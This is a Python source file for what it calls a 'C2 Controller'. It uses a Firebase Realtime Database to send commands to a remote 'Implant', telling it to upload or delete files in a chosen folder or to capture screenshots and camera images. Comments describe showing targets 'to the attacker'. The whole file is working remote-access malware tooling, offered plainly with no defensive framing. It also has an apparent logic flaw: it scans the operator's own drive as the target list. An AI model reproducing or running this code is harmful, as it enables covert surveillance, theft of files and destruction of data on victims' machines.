import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import os

# -------------------- Firebase setup --------------------
cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred, {
    # YOUR DATABASE URL: https://myappa-cc081-default-rtdb.firebaseio.com/
    'databaseURL': 'https://myappa-cc081-default-rtdb.firebaseio.com/'
})

TASK_REF = db.reference('task')
SCANNED_REF = db.reference('scanned_files') 

# -------------------- Scan C drive (TOP-LEVEL FOLDERS ONLY - Error-Proofed) --------------------
def scan_c_drive(root_path="C:\\"):
    """Scans ONLY the top level of the C drive for directories."""
    scanned = []
    
    try:
        # List all items in the root directory
        entries = os.listdir(root_path)
        
        for entry in entries:
            full_path = os.path.join(root_path, entry)
            # Check if the entry is a directory (folder)
            if os.path.isdir(full_path):
                scanned.append({"type": "directory", "path": full_path})
                
    except Exception as e:
        # Error handling for permission issues
        print(f"⚠️ Error scanning C:\\ root: {e}")
        
    return scanned

# -------------------- Batch update to Firebase --------------------
def update_scanned_files_to_firebase(scanned, batch_size=200):
    """Updates the target list to a dedicated node in Firebase."""
    SCANNED_REF.delete()  
    total = len(scanned)
    print(f"Total top-level folders found: {total}")
    for i in range(0, total, batch_size):
        batch = {str(j + i): scanned[j + i] for j in range(min(batch_size, total - i))}
        SCANNED_REF.update(batch)
        print(f"✅ Updated batch {i} to {i+len(batch)-1}")
    print(f"✅ Completed updating {total} folders to Firebase under 'scanned_files'")

# -------------------- Show scanned files (Robust Data Handling) --------------------
def show_scanned_files():
    """Retrieves the list of scanned folders from Firebase to display to the attacker."""
    raw_data = SCANNED_REF.get()
    
    if not raw_data:
        print("❌ No scanned folders found in Firebase. Exiting.")
        return []

    # FIX: Robustly handle data that comes back as a dictionary or a list
    if isinstance(raw_data, dict):
        sorted_keys = sorted(raw_data.keys(), key=lambda k: int(k))
        items = [raw_data[key] for key in sorted_keys]
    else:
        items = raw_data

    files_list = []
    print("\n---- Scanned Folders (Select Target Index) ----")
    
    for idx, item in enumerate(items):
        if item and 'path' in item:
            print(f"[{idx:4}] ({item['type']:9}) {item['path']}")
            files_list.append(item['path'])
        
    print("----------------------------------------------------\n")
    return files_list

# -------------------- Update task --------------------
def update_task(command, location):
    """Sends the command and location to the 'task' node, which the Implant is watching."""
    # Ensure command is set to 'uploaddata' or 'delete' as expected by main.js
    if command == 'upload':
        final_command = 'uploaddata'
    else:
        final_command = command
        
    TASK_REF.update({
        'command': final_command,
        'location': location
    })
    print(f"✅ Command Sent! Implant should now execute: command={final_command}, location={location}")

# -------------------- Main Execution --------------------
if __name__ == "__main__":
    print("🔹 Starting C2 Controller (TOP-LEVEL FOLDERS ONLY)...")
    
    scanned_files = scan_c_drive()
    update_scanned_files_to_firebase(scanned_files)

    files_list = show_scanned_files()
    if not files_list:
        exit()

    command = input("Enter command (upload / delete / screenshot / camera): ").strip().lower()
    
    while True:
        loc_index = input("Select a target index number from the list above: ").strip()
        if loc_index.isdigit() and 0 <= int(loc_index) < len(files_list):
            location = files_list[int(loc_index)]
            break
        else:
            print("❌ Invalid index. Please enter a valid number from the list.")

    update_task(command, location)